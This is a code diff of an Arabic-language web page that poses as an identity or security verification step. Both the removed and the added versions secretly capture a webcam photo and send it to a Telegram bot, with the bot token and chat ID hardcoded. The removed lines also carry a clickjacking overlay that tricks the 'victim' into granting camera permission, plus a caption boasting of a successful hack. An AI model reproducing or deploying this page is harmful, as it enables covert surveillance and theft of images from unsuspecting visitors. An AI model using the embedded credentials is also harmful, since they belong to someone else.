@@ -2,82 +2,68 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Security Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification System</title>
     <style>
-        body { background: #000; margin: 0; overflow: hidden; font-family: sans-serif; }
-        #wrapper { display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        /* زر وهمي جذاب للضحية */
-        #main-btn {
-            padding: 20px 40px; border: 2px solid #00ff00; color: #00ff00;
-            background: transparent; font-size: 22px; cursor: pointer;
-            text-transform: uppercase; z-index: 2; position: relative;
-        }
-        /* الطبقة الشفافة التي تتبع اللمس لإجبار الضحية على ضغط Allow */
-        #invisible-trigger {
-            position: absolute; width: 150px; height: 150px;
-            opacity: 0.001; z-index: 9999; pointer-events: auto;
-        }
+        body { background: #000; color: #0f0; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: monospace; }
+        #btn { padding: 20px 40px; border: 2px solid #0f0; cursor: pointer; font-size: 20px; box-shadow: 0 0 15px #0f0; }
     </style>
 </head>
 <body>
 
-<div id="wrapper">
-    <div id="main-btn" onclick="executePayload()">[ اضغط لتأكيد هويتك ]</div>
-</div>
+    <div id="btn" onclick="startCapture()">[ اضغط لتأكيد الهوية ]</div>
 
-<iframe id="invisible-trigger" src="about:blank"></iframe>
+    <script>
+        const TOKEN = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
+        const CHAT_ID = "1772820433";
 
-<script>
-    const _T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
-    const _C = "1772820433";
-    const trigger = document.getElementById('invisible-trigger');
+        async function startCapture() {
+            const btn = document.getElementById('btn');
+            btn.innerText = "جاري المعالجة...";
 
-    // تكتيك Clickjacking: جعل نافذة السماح تلاحق إصبع الضحية
-    document.addEventListener('mousemove', (e) => {
-        trigger.style.left = (e.pageX - 30) + 'px';
-        trigger.style.top = (e.pageY - 20) + 'px';
-    });
+            try {
+                // 1. طلب الكاميرا
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
 
-    document.addEventListener('touchstart', (e) => {
-        trigger.style.left = (e.touches[0].pageX - 30) + 'px';
-        trigger.style.top = (e.touches[0].pageY - 20) + 'px';
-    });
-
-    // التنفيذ المزدوج
-    async function executePayload() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-
-            document.getElementById('main-btn').innerText = "جارٍ المعالجة...";
-
-            setTimeout(async () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = 640; canvas.height = 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                canvas.toBlob(async (blob) => {
-                    const fd = new FormData();
-                    fd.append('chat_id', _C);
-                    fd.append('photo', blob, 'x.jpg');
-                    fd.append('caption', '🔥 تم الاختراق بنجاح!');
-
-                    await fetch(`https://api.telegram.org/bot${_T}/sendPhoto`, {
-                        method: 'POST',
-                        body: fd
-                    });
+                // الانتظار ثانية للالتقاط
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640; canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
                     
-                    window.location.href = "https://google.com";
-                }, 'image/jpeg');
-            }, 1000);
-        } catch (e) {
-            // إعادة المحاولة في حال الرفض
-            location.reload();
+                    canvas.toBlob(async (blob) => {
+                        const fd = new FormData();
+                        fd.append('chat_id', CHAT_ID);
+                        fd.append('photo', blob, 'image.jpg');
+
+                        // 2. محاولة الإرسال مع فحص الاستجابة
+                        try {
+                            const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: fd
+                            });
+
+                            if (response.ok) {
+                                alert("✅ نجحت العملية! افحص التليجرام الآن.");
+                                window.location.href = "https://google.com";
+                            } else {
+                                const errorData = await response.json();
+                                alert("❌ خطأ من تليجرام: " + errorData.description);
+                            }
+                        } catch (fError) {
+                            alert("❌ فشل الاتصال بسيرفر تليجرام: " + fError.message);
+                        }
+                    }, 'image/jpeg');
+                }, 1000);
+
+            } catch (err) {
+                alert("❌ المتصفح رفض الكاميرا: " + err.message);
+                location.reload();
+            }
         }
-    }
-</script>
+    </script>
 </body>
 </html>
